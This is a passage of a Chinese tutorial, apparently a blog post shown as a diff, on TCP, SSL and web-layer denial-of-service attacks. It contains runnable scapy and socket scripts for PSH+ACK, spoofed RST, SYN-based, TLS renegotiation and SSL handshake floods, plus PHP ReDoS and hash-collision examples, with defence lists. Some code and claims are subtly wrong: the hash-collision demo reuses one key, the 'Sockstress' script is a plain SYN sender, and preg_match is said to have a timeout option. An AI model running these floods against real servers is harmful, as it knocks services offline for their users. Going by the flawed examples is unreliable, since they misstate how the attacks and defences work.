+<h6 id="代码示例-7"><a href="#代码示例-7" class="headerlink" title="代码示例"></a>代码示例</h6><p>使用 Python 的 <code>scapy</code> 库实现的 PSH+ACK 洪水攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 IP 和端口</span></span><br><span class="line">target_ip = <span class="string">&quot;victim_ip&quot;</span></span><br><span class="line">target_port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造源 IP</span></span><br><span class="line">source_ip = <span class="string">&quot;attacker_ip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 PSH+ACK 包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">psh_ack_flood</span>():</span><br><span class="line">    ip = IP(src=source_ip, dst=target_ip)</span><br><span class="line">    ps = TCP(sport=random.randint(<span class="number">1024</span>, <span class="number">65535</span>), dport=target_port, flags=<span class="string">&quot;PA&quot;</span>, seq=random.randint(<span class="number">1</span>, <span class="number">1000</span>))</span><br><span class="line">    packet = ip/ps</span><br><span class="line">    send(packet, loop=<span class="number">1</span>, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动攻击</span></span><br><span class="line">psh_ack_flood()</span><br></pre></td></tr></table></figure>
+
+<h6 id="防护方式-5"><a href="#防护方式-5" class="headerlink" title="防护方式"></a>防护方式</h6><ul>
+<li>流量分析：监控异常的 PSH+ACK 流量，及时发现并阻止。</li>
+<li>速率限制：对来自单个源 IP 的 PSH+ACK 数据包进行速率限制。</li>
+<li>深度包检测：分析数据包内容，识别并过滤无意义的数据包。</li>
+</ul>
+<h5 id="RST洪水攻击-连接中止"><a href="#RST洪水攻击-连接中止" class="headerlink" title="RST洪水攻击 - 连接中止"></a><strong>RST洪水攻击 - 连接中止</strong></h5><h6 id="协议原理-2"><a href="#协议原理-2" class="headerlink" title="协议原理"></a>协议原理</h6><p>TCP 连接的终止通过四次挥手过程：</p>
+<ol>
+<li><strong>FIN</strong>：一方发送 FIN 数据包，表示希望关闭连接</li>
+<li><strong>ACK</strong>：接收方确认收到 FIN 数据包</li>
+<li><strong>FIN</strong>：接收方发送 FIN 数据包，表示同意关闭连接</li>
+<li><strong>ACK</strong>：发送方确认收到 FIN 数据包，连接关闭</li>
+</ol>
+<h6 id="攻击原理-4"><a href="#攻击原理-4" class="headerlink" title="攻击原理"></a>攻击原理</h6><p>在 TCP 连接中，<strong>RST（Reset）</strong> 数据包用于强制关闭连接。当攻击者发送一个带有 RST 标志的数据包时，如果该数据包的序列号和目标主机的接收窗口匹配，目标主机会认为该连接已经被断开并且会关闭连接，导致拒绝服务。在伪造 RST 报文的过程中，服务端的 IP 地址和端口号是已知的，攻击者还需要设法获取客户端的 IP 地址和端口号，并且使 RST 报文的序列号处于服务器的接收窗口之内。</p>
+<p>如果攻击者和被攻击客户端或服务器处于同一内网，这些信息可以通过欺骗和嗅探等方式获取到。但一般攻击者处在外网，在这种情况下，攻击者可以利用大量的受控主机猜测序列号和客户端端口来进行盲打，只要在数量巨大的 RST 报文中有一条与攻击目标的端口号相同，且序列号落在目标的接收窗口之中，就能够中断连接。</p>
+<h6 id="代码示例-8"><a href="#代码示例-8" class="headerlink" title="代码示例"></a>代码示例</h6><p>在 TCP 连接中，<strong>RST（Reset）</strong> 数据包用于强制关闭连接。当攻击者发送一个带有 RST 标志的数据包时，如果该数据包的序列号和目标主机的接收窗口匹配，目标主机会认为该连接已经被断开并且会关闭连接。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 IP 和端口，攻击者需要知道目标服务器的 IP 地址和端口号。</span></span><br><span class="line">target_ip = <span class="string">&quot;victim_ip&quot;</span></span><br><span class="line">target_port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设攻击者知道目标连接的客户端 IP 和端口，实际应用时攻击者需要猜测或知道目标连接的客户端 IP 和端口号。</span></span><br><span class="line">client_ip = <span class="string">&quot;client_ip&quot;</span></span><br><span class="line">client_port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设攻击者猜测序列号的范围（在攻击实际应用中，这部分通常通过嗅探或其他方法获取）</span></span><br><span class="line"><span class="comment"># 目标接收窗口通常较大，攻击者通过盲打来猜测有效的序列号</span></span><br><span class="line">sequence_number = random.randint(<span class="number">1000</span>, <span class="number">5000</span>)  <span class="comment"># 假设猜测的序列号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造伪造的 RST 包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rst_flood_with_sequence</span>():</span><br><span class="line">    ip = IP(src=client_ip, dst=target_ip)</span><br><span class="line">    <span class="comment"># RST 包需要伪造目标的端口和序列号</span></span><br><span class="line">    rst = TCP(sport=client_port, dport=target_port, flags=<span class="string">&quot;R&quot;</span>, seq=sequence_number)</span><br><span class="line">    packet = ip/rst</span><br><span class="line">    send(packet, loop=<span class="number">1</span>, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动攻击</span></span><br><span class="line">rst_flood_with_sequence()</span><br></pre></td></tr></table></figure>
+
+<h6 id="防护方式-6"><a href="#防护方式-6" class="headerlink" title="防护方式"></a>防护方式</h6><ul>
+<li><strong>TCP 连接的验证</strong>：通过加强 TCP 连接的验证来避免伪造的 RST 包。例如，验证 RST 包的源端口和源 IP 是否与连接的实际端口和 IP 匹配。</li>
+<li><strong>序列号验证</strong>：服务器可以通过对传入的 RST 包的序列号进行验证，确保它在当前连接的接收窗口内。若序列号不匹配，服务器应丢弃该 RST 包。</li>
+</ul>
+<h5 id="Sockstress慢速攻击（Sockstress-Slowloris-Attack）"><a href="#Sockstress慢速攻击（Sockstress-Slowloris-Attack）" class="headerlink" title="Sockstress慢速攻击（Sockstress Slowloris Attack）"></a><strong>Sockstress慢速攻击（Sockstress Slowloris Attack）</strong></h5><h6 id="协议原理-3"><a href="#协议原理-3" class="headerlink" title="协议原理"></a>协议原理</h6><p><strong>Sockstress</strong> 攻击是一种 <strong>慢速拒绝服务（Slow DoS）</strong> 攻击，主要针对 TCP 连接的建立和资源分配过程，尤其是在服务器端使用大量资源来处理连接时，能够使服务器进入资源枯竭的状态。Sockstress 攻击利用 TCP 协议的 <strong>半开连接</strong> 特性，攻击者通过不断发送半开连接请求来占用目标服务器的连接资源。</p>
+<p>具体来说，Sockstress 攻击通过 <strong>慢速数据传输</strong> 来迫使目标服务器将连接保持在 <strong>半开</strong> 或 <strong>部分关闭</strong> 状态。目标服务器在等待完整的数据包时，消耗大量资源，但攻击者从不完成连接的建立或断开连接的过程。这样，攻击者可以在不生成大量流量的情况下，使目标服务器资源枯竭。</p>
+<h6 id="攻击原理-5"><a href="#攻击原理-5" class="headerlink" title="攻击原理"></a>攻击原理</h6><p>Sockstress 攻击通过慢速向目标服务器发送数据，持续占用服务器的连接池，导致服务器无法为新的合法用户分配资源。攻击者通过以下几种方式进行攻击：</p>
+<ol>
+<li><strong>半开连接（TCP Handshake）</strong>：攻击者利用 <strong>SYN Flood</strong> 等手段向目标服务器发送连接请求，但没有响应确认（ACK）。这样，目标服务器会保持连接请求，等待响应，导致连接池被占用。</li>
+<li><strong>缓慢发送数据</strong>：攻击者逐步向目标服务器发送数据包，而不是立即发送全部数据。目标服务器会一直等待数据的接收，这样服务器资源会被占用，无法处理其他连接。</li>
+<li><strong>保持连接打开</strong>：攻击者通过不断发送少量数据或定时发送一些空的请求，保持连接处于打开状态，耗尽服务器的连接资源。由于目标服务器无法及时关闭这些连接，它会消耗更多资源等待数据完成。</li>
+</ol>
+<h6 id="代码示例-9"><a href="#代码示例-9" class="headerlink" title="代码示例"></a>代码示例</h6><p>使用 Python 的 <code>scapy</code> 库实现 Sockstress 攻击示例，通过发送缓慢的数据包，保持与目标的连接持续进行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 IP 和端口</span></span><br><span class="line">target_ip = <span class="string">&quot;victim_ip&quot;</span></span><br><span class="line">target_port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造源 IP</span></span><br><span class="line">source_ip = <span class="string">&quot;attacker_ip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 慢速数据包发送</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slowloris_attack</span>():</span><br><span class="line">    <span class="comment"># 每次发送的数据包大小</span></span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span> * random.randint(<span class="number">10</span>, <span class="number">50</span>)  <span class="comment"># 每次发送 10 到 50 字节</span></span><br><span class="line">    ip = IP(src=source_ip, dst=target_ip)</span><br><span class="line">    tcp = TCP(sport=random.randint(<span class="number">1024</span>, <span class="number">65535</span>), dport=target_port, flags=<span class="string">&quot;S&quot;</span>, seq=random.randint(<span class="number">1</span>, <span class="number">1000</span>))</span><br><span class="line">    packet = ip/tcp/payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送 SYN 请求并保持连接</span></span><br><span class="line">    send(packet, loop=<span class="number">1</span>, verbose=<span class="number">0</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 每秒发送一个数据包，模拟慢速数据传输</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动攻击</span></span><br><span class="line">slowloris_attack()</span><br></pre></td></tr></table></figure>
+
+<h6 id="防护方式-7"><a href="#防护方式-7" class="headerlink" title="防护方式"></a>防护方式</h6><ol>
+<li><p>连接限制</p>
+<p>：</p>
+<ul>
+<li><strong>连接池限制</strong>：限制每个客户端或每个源 IP 地址的连接数，防止单个源通过大量半开连接或慢速连接占用所有资源。</li>
+</ul>
+</li>
+<li><p>超时机制</p>
+<p>：</p>
+<ul>
+<li><strong>短时间内无数据的连接超时</strong>：可以设置服务器在一段时间内没有接收到数据时就主动关闭连接。这样，攻击者通过慢速数据传输保持连接的方式就会被切断。</li>
+<li><strong>TCP 空闲超时</strong>：设置一个空闲超时时间，当某个连接在规定时间内没有进行任何数据交换时，强制关闭该连接。</li>
+</ul>
+</li>
+<li><p>流量监控与分析</p>
+<p>：</p>
+<ul>
+<li><strong>深度包检测（DPI）</strong>：使用深度包检测技术，分析流量中是否有异常的慢速数据包。通过检测是否有大量连接处于半开状态、是否存在大量无数据或极小数据包的流量，可以识别并拦截 Sockstress 攻击。</li>
+<li><strong>速率限制</strong>：对来自单一源的连接进行速率限制，减少每秒钟接收到的连接请求的数量。可以有效减少攻击者利用慢速连接占用资源的机会。</li>
+</ul>
+</li>
+</ol>
+<h4 id="攻击-SSL-连接"><a href="#攻击-SSL-连接" class="headerlink" title="攻击 SSL 连接"></a>攻击 SSL 连接</h4><p>SSL协议加密、解密和密钥协商的过程中会消耗大量的系统资源，如果使用RSA系列的公钥密码算法，那么服务器端所要消耗的资源都会比客户端多。</p>
+<p>在最极端的情况下，使用RSA 4096进行加解密，服务器端需要花费相当于客户端资源的25倍才能完成计算。</p>
+<p>攻击者可以利用SSL协议消耗资源的特性进行拒绝服务攻击。</p>
+<h5 id="THC-SSL-Dos慢速攻击"><a href="#THC-SSL-Dos慢速攻击" class="headerlink" title="THC SSL Dos慢速攻击"></a><strong>THC SSL Dos慢速攻击</strong></h5><blockquote>
+<p>在进行 SSL 数据传输之前，通信双方首先要进行 SSL 握手，协商加密算法交换加密密钥，进行身份认证。通常情况下，这样的 SSL 握手过程只需要进行一次即可， 但是在SSL协议中有一个 Renegotiation 选项，通过它可以进行密钥的重新协商以建立新的密钥。在进行 SSL 连接并握手之后，攻击者反复不断地进行密钥重新协商过程，而密钥重协商过程需要服务器投入的 CPU 资源通常比客户端多。</p>
+</blockquote>
+<h6 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h6><ul>
+<li><strong>客户端发起请求</strong>：攻击者向目标服务器发送 SSL&#x2F;TLS 握手请求，建立一个初始连接。</li>
+<li><strong>触发重新协商</strong>：一旦连接建立，攻击者通过特意发送请求（触发 Renegotiation）来启动 SSL&#x2F;TLS 重新协商过程。</li>
+<li><strong>反复协商</strong>：攻击者在没有正常完成握手的情况下，持续发送重新协商请求，迫使服务器反复进行密钥交换、加密运算等高消耗的计算操作。</li>
+<li><strong>服务器资源耗尽</strong>：由于每次协商都需要计算和加密处理，攻击者通过快速重复这种行为，将服务器的计算资源消耗殆尽，导致服务器无法处理正常请求。</li>
+</ul>
+<h6 id="代码示例-10"><a href="#代码示例-10" class="headerlink" title="代码示例"></a>代码示例</h6><p>使用 python 的 ssl 与 socket 库模拟重新发起协商的过程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标服务器的 IP 和端口</span></span><br><span class="line">target_ip = <span class="string">&#x27;victim_ip&#x27;</span></span><br><span class="line">target_port = <span class="number">443</span>  <span class="comment"># 默认 HTTPS 端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击函数：触发 SSL/TLS 重新协商</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssl_dos_attack</span>():</span><br><span class="line">    <span class="comment"># 创建 SSL 上下文</span></span><br><span class="line">    context = ssl.create_default_context() <span class="comment"># 创建一个 SSL 上下文，确保建立安全的 SSL 连接。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 建立到目标服务器的基础连接。</span></span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((target_ip, target_port)) <span class="keyword">as</span> sock:</span><br><span class="line">        <span class="comment"># 使用 SSL 包装连接</span></span><br><span class="line">        ssock = context.wrap_socket(sock, server_hostname=target_ip)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送初始的 HTTP 请求（可以模拟一个正常的请求）</span></span><br><span class="line">        ssock.send(<span class="string">b&quot;GET / HTTP/1.1\\r\\nHost: victim_ip\\r\\n\\r\\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 每隔一段时间，发送重新协商请求，触发 Renegotiation。每次调用此方法都会进行一个 SSL 握手，实际上是重新协商阶段。</span></span><br><span class="line">            ssock.do_handshake()  <span class="comment"># 触发重新协商</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Triggering SSL Renegotiation...&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 每次发送请求后等待一小段时间，模拟攻击过程</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动攻击</span></span><br><span class="line">ssl_dos_attack()</span><br></pre></td></tr></table></figure>
+
+<h6 id="防护方式-8"><a href="#防护方式-8" class="headerlink" title="防护方式"></a>防护方式</h6><ul>
+<li><strong>禁用不必要的重新协商</strong>：服务器可以禁用或限制 SSL&#x2F;TLS 连接中的重新协商功能。如果服务器的业务不需要频繁的重新协商，可以通过关闭此功能来减少攻击面。</li>
+<li><strong>限制重新协商的频率</strong>：设置每个连接的重新协商次数限制，防止攻击者通过频繁的重新协商请求消耗服务器资源。</li>
+<li><strong>TCP连接限制</strong>：防火墙可以限制每个客户端建立的连接数，防止同一源发起大量的重新协商请求。</li>
+<li><strong>SSL&#x2F;TLS 会话缓存</strong>：启用 SSL&#x2F;TLS 会话缓存，减少重新协商的次数。通过缓存以前的会话，服务器不需要每次都进行耗时的协商计算。</li>
+</ul>
+<h5 id="SSL-Flood"><a href="#SSL-Flood" class="headerlink" title="SSL Flood"></a><strong>SSL Flood</strong></h5><h6 id="攻击原理-6"><a href="#攻击原理-6" class="headerlink" title="攻击原理"></a>攻击原理</h6><p>SSL Flood 攻击利用 SSL&#x2F;TLS 握手中的计算开销进行攻击。每个 SSL 握手请求都需要服务器执行大量的计算（如证书验证、加密解密等），如果攻击者向服务器发送大量握手请求，服务器将消耗大量计算资源，从而无法处理合法的请求。</p>
+<h6 id="攻击步骤-1"><a href="#攻击步骤-1" class="headerlink" title="攻击步骤"></a>攻击步骤</h6><ol>
+<li>攻击者向目标服务器发送大量的 SSL&#x2F;TLS 握手请求（客户端 Hello）。</li>
+<li>目标服务器响应每个请求并开始进行证书验证和加密运算，消耗大量 CPU 资源。</li>
+<li>攻击者不完成握手过程（没有发送客户端的证书和密钥交换），导致服务器的计算资源被长时间占用。</li>
+</ol>
+<h6 id="代码示例-11"><a href="#代码示例-11" class="headerlink" title="代码示例"></a>代码示例</h6><p>使用 Python 和 <code>ssl</code> 库的简化版本代码，模拟一个 SSL Flood 攻击，通过发送 SSL 握手请求来占用目标服务器的资源。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标服务器的 IP 和端口</span></span><br><span class="line">target_ip = <span class="string">&#x27;victim_ip&#x27;</span></span><br><span class="line">target_port = <span class="number">443</span>  <span class="comment"># 默认 HTTPS 端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送大量的 SSL 握手请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssl_flood_attack</span>():</span><br><span class="line">    context = ssl.create_default_context()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 连接到目标服务器</span></span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((target_ip, target_port)) <span class="keyword">as</span> sock:</span><br><span class="line">        <span class="comment"># 使用 SSL 包装连接</span></span><br><span class="line">        ssock = context.wrap_socket(sock, server_hostname=target_ip)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送 SSL 握手请求</span></span><br><span class="line">            ssock.send(<span class="string">b&quot;GET / HTTP/1.1\\r\\nHost: victim_ip\\r\\n\\r\\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动攻击</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    ssl_flood_attack()</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击-Web资源"><a href="#攻击-Web资源" class="headerlink" title="攻击 Web资源"></a>攻击 Web资源</h3><h4 id="HTTP-慢速攻击"><a href="#HTTP-慢速攻击" class="headerlink" title="HTTP 慢速攻击"></a>HTTP 慢速攻击</h4><p>HTTP慢速攻击也叫slow http attack，是一种DoS攻击的方式。由于HTTP请求底层使用TCP网络连接进行会话，因此如果中间件对会话超时时间设置不合理，并且HTTP在发送请求的时候采用慢速发HTTP请求，就会导致占用一个HTTP连接会话。如果发送大量慢速的HTTP包就会导致拒绝服务攻击DoS。</p>
+<h5 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h5><ul>
+<li><strong>Slow headers</strong>(也称slowloris)：Web应用在处理HTTP请求之前都要先接收完所有的HTTP头部，Web服务器再没接收到2个连续的\r\n时，会认为客户端没有发送完头部，而持续的等等客户端发送数据，消耗服务器的连接和内存资源。</li>
+<li><strong>Slow body</strong> (也称 Slow HTTP POST)：攻击者发送一个 HTTP POST 请求，该请求的 Content-Length 头部值很大，使得 Web 服务器或代理认为客户端要发送很大的数据。服务器会保持连接准备接收数据，但攻击客户端每次只发送很少量的数据，使该连接一直保持存活，消耗服务器的连接和内存资源。</li>
+<li><strong>Slow read</strong> (也称 Slow Read attack )：客户端与服务器建立连接并发送了一个 HTTP 请求，客户端发送完整的请求给服务器端，然后一直保持这个连接，以很低的速度读取 Response ，比如很长一段时间客户端不读取任何数据，通过发送 Zero Window 到服务器，让服务器误以为客户端很忙，直到连接快超时前才读取一个字节，以消耗服务器的连接和内存资源。</li>
+</ul>
+<h4 id="数据处理过程攻击"><a href="#数据处理过程攻击" class="headerlink" title="数据处理过程攻击"></a>数据处理过程攻击</h4><p>web服务器在收到HTTP请求之后，需要检查并处理其中的数据，通过恶意构造请求数据的内容，攻击者可以显著的增加数据处理过程中的资源消耗，造成拒绝服务攻击。</p>
+<h5 id="正则表达式拒绝服务攻击"><a href="#正则表达式拒绝服务攻击" class="headerlink" title="正则表达式拒绝服务攻击"></a>正则表达式拒绝服务攻击</h5><p>ReDoS，利用恶意构造的输入字符串，攻击者只需要提交相对较短的输入字符串，就可以强制正则引擎处理数亿个匹配路径，所需时间可以达到几个小时甚至几天，造成web服务器拒绝服务。</p>
+<p>以 PHP 为例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ReDoS 示例：这个正则表达式对特定输入会发生回溯攻击</span></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/^(a|aa|aaa|aaaa)+$/&#x27;</span>; <span class="comment">// 复杂的正则，容易引发回溯</span></span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;a&#x27;</span>, <span class="number">100000</span>);  <span class="comment">// 长度为100000的字符串，由&#x27;a&#x27;组成</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配失败&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="防护方式-9"><a href="#防护方式-9" class="headerlink" title="防护方式"></a>防护方式</h6><ol>
+<li>避免使用容易引起回溯的正则表达式：避免在正则表达式中使用重复的量词（如 <code>+</code> 和 &#96;&#96;）与捕获组结合的方式，尤其是没有明确的限制条件时。</li>
+<li>优化正则表达式：将正则表达式优化为更加高效的形式，避免产生复杂的回溯过程。</li>
+<li>使用正则表达式超时限制：可以在 Web 服务器上配置正则引擎的超时限制，或者使用 PHP 的 <code>preg_match()</code> 函数的 <code>timeout</code> 选项来控制正则匹配的最大时间。</li>
+<li>限制请求大小：通过对输入数据的大小进行限制，减少攻击者可以提交的恶意数据量。</li>
+</ol>
+<h5 id="哈希冲突拒绝服务攻击（Hash-DoS）"><a href="#哈希冲突拒绝服务攻击（Hash-DoS）" class="headerlink" title="哈希冲突拒绝服务攻击（Hash DoS）"></a>哈希冲突拒绝服务攻击（Hash DoS）</h5><p>web 应用在处理请求中的 POST 数据时，通常使用键-值对的方式来进行存储，在 PHP、Python、Java 等语言中，键-值对的实质是一个哈希表，web 应用程序通过计算“键”的哈希来获取其所对应的的“值”。正常情况下，这个哈希表的哈希冲突较少，因此进行查找和插入的速度很快，如果攻击者构造一组恶意的 POST 数据，使得请求中的“键”的哈希值全部相同，那么保存 POST 数据的哈希表就会因此退化成为链表 ，对哈希表的查找和插入等操作规则变成了对链表的遍历操作，造成大量的计算资源被占用，导致拒绝服务攻击。</p>
+<h6 id="代码示例-12"><a href="#代码示例-12" class="headerlink" title="代码示例"></a>代码示例</h6><p>PHP 中使用关联数据 (hash table)来处理请求中的数据。当 hash 表发生大量冲突时，处理速度会显著下降</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 假设接收POST数据并将其存储为关联数组</span></span><br><span class="line"><span class="comment">// 正常情况下，键的哈希值会有较好的分布，查询和插入速度较快。</span></span><br><span class="line"><span class="comment">// 但如果攻击者构造恶意的“键”，导致哈希冲突，查询和插入将退化为链表操作。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟恶意构造的POST数据</span></span><br><span class="line"><span class="variable">$postData</span> = [];</span><br><span class="line"><span class="comment">// 通过哈希冲突攻击，故意构造一组具有相同哈希值的键</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">100000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;a&#x27;</span>, <span class="number">100</span>); <span class="comment">// 假设这里的键在 PHP 中的哈希值相同</span></span><br><span class="line">    <span class="variable">$postData</span>[<span class="variable">$key</span>] = <span class="string">&#x27;value&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟处理过程</span></span><br><span class="line"><span class="variable">$start</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$postData</span>[<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;a&#x27;</span>, <span class="number">100</span>)];  <span class="comment">// 查询某个键</span></span><br><span class="line"><span class="variable">$end</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出查询消耗的时间</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;查询消耗时间: &quot;</span> . (<span class="variable">$end</span> - <span class="variable">$start</span>) . <span class="string">&quot;秒&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
